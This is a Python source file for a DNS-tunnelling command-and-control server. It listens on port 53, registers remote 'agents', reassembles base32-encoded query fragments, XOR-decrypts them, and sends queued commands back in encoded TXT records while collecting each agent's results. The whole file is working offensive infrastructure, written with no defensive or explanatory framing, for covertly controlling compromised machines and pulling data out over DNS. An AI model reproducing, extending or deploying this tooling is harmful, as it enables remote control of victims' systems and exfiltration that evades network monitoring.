import socket
import threading
import base64
import json
import time
from datetime import datetime
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT

_MAX_FRAG_BYTES     = 262144 
_FRAG_STALE_SECS    = 15.0  
_AGENT_TIMEOUT_S    = 300    
_CMD_RESEND_TIMEOUT = 10     



class tunnel:
    def __init__(self, host='0.0.0.0', port=53, encryption_key=None):
        self.host             = host
        self.port             = port
        self.sock             = None
        self.running          = False
        self.agents           = {}
        self.encryption_key   = encryption_key if encryption_key else "default_key"
        self.fragment_buffers = {}      
        self._frag_timestamps = {}       
        self.lock             = threading.Lock()
        self.log_callback     = None
        self.listener_thread  = None

    def slogc(self, callback):
        self.log_callback = callback

    def log(self, message):
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        msg = f"{timestamp} [DNS] {message}"

        ui_keywords = [
            "SYS:  New agent", "ERROR",
            "SYS:  Agent response", "SYS:  Server started",
        ]
        if self.log_callback and any(k in message for k in ui_keywords):
            self.log_callback(msg)
        print(msg)

    def xor_cipher(self, data, key):
        key_bytes = key.encode()
        if isinstance(data, str):
            data = data.encode()
        return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])

    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65535)

            self.log(f"Attempting to bind DNS server to {(self.host, self.port)}")
            self.sock.bind((self.host, self.port))
            self.log(f"SYS: DNS Server successfully bound to {self.sock.getsockname()}")
            self.sock.settimeout(0.5)

            self.running         = True
            self.listener_thread = threading.Thread(
                target=self._listen, daemon=True, name="dns-listener"
            )
            self.listener_thread.start()
            self.log("SYS: DNS listener thread started")
            return True

        except OSError as e:
            err = str(e).lower()
            if "already in use" in err:
                self.log(f"ERROR: Port {self.port} already in use")
                self.log("SOLUTION: Stop system DNS or use an alternative port (5353)")
            elif "access is denied" in err:
                self.log("ERROR: Access denied — run the controller as Administrator")
            else:
                self.log(f"ERROR: Bind failed: {e}")
            return False
        except Exception as e:
            import traceback
            self.log(f"ERROR: Unexpected error: {e}")
            self.log(traceback.format_exc())
            return False

    def stop(self):
        self.log("SYS:  Stopping DNS server...")
        self.running = False

        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

        if self.listener_thread and self.listener_thread.is_alive():
            self.listener_thread.join(timeout=3)

        with self.lock:
            self.agents.clear()
            self.fragment_buffers.clear()
            self._frag_timestamps.clear()

        self.log("SYS:  DNS Server stopped")

    def _listen(self):
        self.log("DNS listener thread started — waiting for packets...")
        packet_count = 0

        while self.running:
            try:
                data, addr = self.sock.recvfrom(512)
            except socket.timeout:
                continue
            except OSError:

                break
            except Exception as e:
                if self.running:
                    self.log(f"SYS:  Listen error: {e}")
                continue

            packet_count += 1
            if packet_count <= 10 or packet_count % 100 == 0:
                self.log(
                    f"SYS: Packet #{packet_count} from "
                    f"{addr[0]}:{addr[1]} ({len(data)} bytes)"
                )
            self._handle_query(data, addr)

    def _handle_query(self, data, addr):
        try:
            request = DNSRecord.parse(data)
            qname   = str(request.q.qname).rstrip('.')
            parts   = qname.split('.')

            if len(parts) < 2:
                return

            base32_fragment = parts[0]
            agent_id        = parts[1]

            with self.lock:
                buf       = self.fragment_buffers.get(agent_id, "")
                last_frag = self._frag_timestamps.get(agent_id, 0.0)
                frag_now  = time.monotonic()
                stale    = bool(buf) and (frag_now - last_frag > _FRAG_STALE_SECS)
                overflow = (len(buf) + len(base32_fragment) > _MAX_FRAG_BYTES)

                if stale:
                    self.log(
                        f"WARN: Fragment buffer for {agent_id} stale "
                        f"({frag_now - last_frag:.1f}s since last fragment, "
                        f"{len(buf)} bytes) — resetting"
                    )
                    buf = ""
                elif overflow:
                    self.log(
                        f"WARN: Fragment overflow for {agent_id} "
                        f"({len(buf)} bytes) — resetting"
                    )
                    buf = ""

                buf += base32_fragment
                self.fragment_buffers[agent_id]  = buf
                self._frag_timestamps[agent_id]  = frag_now
                accumulated = buf

            try:
                padded = accumulated.upper()
                while len(padded) % 8 != 0:
                    padded += '='

                decoded_b32 = base64.b32decode(padded)
                xor_data    = base64.b64decode(decoded_b32)
                decrypted   = self.xor_cipher(xor_data, self.encryption_key)
                msg_str     = decrypted.decode('utf-8').strip('\x00')
                message     = json.loads(msg_str)

                with self.lock:
                    self.fragment_buffers.pop(agent_id, None)
                    self._frag_timestamps.pop(agent_id, None)

                self._process_message(agent_id, message, request, addr)

            except json.JSONDecodeError:

                self._send_ack(request, addr)

            except (base64.binascii.Error, UnicodeDecodeError):

                self._send_ack(request, addr)

        except Exception as e:
            self.log(f"WARN: _handle_query exception: {e}")

    def _send_ack(self, request, addr):

        reply = request.reply()
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("1.1.1.1")))
        if self.sock and self.running:
            try:
                self.sock.sendto(reply.pack(), addr)
            except Exception:
                pass

    def _process_message(self, agent_id, message, request, addr):
        with self.lock:
            if agent_id not in self.agents:
                self.agents[agent_id] = {
                    'last_seen':         time.time(),
                    'pending_cmd':       None,
                    'last_response':     None,
                    'awaiting_response': False,
                    'cmd_sent_time':     0,
                    'ip':                addr[0],
                }
                self.log(f"SYS:  New agent registered: {agent_id} (IP: {addr[0]})")

            agent              = self.agents[agent_id]
            agent['last_seen'] = time.time()
            agent['ip']        = addr[0]

            msg_type = message.get('type')

            if msg_type == 'request_cmd':
                if agent.get('awaiting_response') and agent.get('pending_cmd'):
                    elapsed = time.time() - agent.get('cmd_sent_time', 0)
                    if elapsed > _CMD_RESEND_TIMEOUT:
                        self.log(
                            f"⚠ TIMEOUT: {agent_id} didn't ACK command after "
                            f"{elapsed:.1f}s — resetting flag"
                        )
                        agent['awaiting_response'] = False

                if agent['pending_cmd'] and not agent['awaiting_response']:
                    resp = {'status': 'command', 'data': agent['pending_cmd']}
                    self.log(f"SYS:  Sending command to {agent_id}: {agent['pending_cmd']}")
                    agent['awaiting_response'] = True
                    agent['cmd_sent_time']     = time.time()
                else:
                    resp = {'status': 'ack', 'data': 'no_cmd'}

            elif msg_type == 'result':
                result_data                = message.get('data', '')
                agent['last_response']     = result_data
                agent['awaiting_response'] = False
                agent['pending_cmd']       = None
                agent['cmd_sent_time']     = 0
                self.log(f"SYS:  Result received from {agent_id}")
                resp = {'status': 'ack', 'data': 'received'}

            elif msg_type == 'beacon':
                resp = {'status': 'ack', 'data': 'beacon_ok'}

            else:
                resp = {'status': 'ack', 'data': 'unknown_type'}

        self.enc_res(resp, request, addr)


    def enc_res(self, data, request, addr):

        try:
            if not self.running:
                return

            json_str = json.dumps(data)
            xor_enc  = self.xor_cipher(json_str, self.encryption_key)
            b64_enc  = base64.b64encode(xor_enc).decode()
            b32_enc  = base64.b32encode(b64_enc.encode()).decode().lower().replace("=", "")

            MAX_CHUNK = 250
            reply     = request.reply()

            if len(b32_enc) <= MAX_CHUNK:
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(b32_enc)))
            else:
                chunks = [
                    b32_enc[i:i + MAX_CHUNK]
                    for i in range(0, len(b32_enc), MAX_CHUNK)
                ]
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunks)))
                self.log(f"SYS:  TXT record split into {len(chunks)} chunks")

            if self.sock and self.running:
                try:
                    self.sock.sendto(reply.pack(), addr)
                except (OSError, socket.error) as e:
                    if self.running:
                        self.log(f"WARN: sendto failed: {e}")

        except Exception as e:
            if self.running:
                self.log(f"SYS:  ERROR sending response: {e}")

    def send_command(self, agent_id, command):
        with self.lock:
            if agent_id not in self.agents:
                return False
            agent = self.agents[agent_id]
            self.log(f"DEBUG: Queuing command for {agent_id}: {command}")
            agent['pending_cmd']       = command
            agent['awaiting_response'] = False  
            return True

    def agent_r(self, agent_id):
        with self.lock:
            if agent_id not in self.agents:
                return None
            agent    = self.agents[agent_id]
            response = agent.get('last_response')
            if response:
                agent['last_response'] = None
                self.fragment_buffers.pop(agent_id, None)
                self._frag_timestamps.pop(agent_id, None)
                return response
        return None

    def list_agent(self):

        with self.lock:
            now    = time.time()
            return [
                {
                    'id':        aid,
                    'last_seen': info.get('last_seen', now),
                    'ip':        info.get('ip', 'Unknown'),
                }
                for aid, info in self.agents.items()
                if now - info.get('last_seen', 0) < _AGENT_TIMEOUT_S
            ]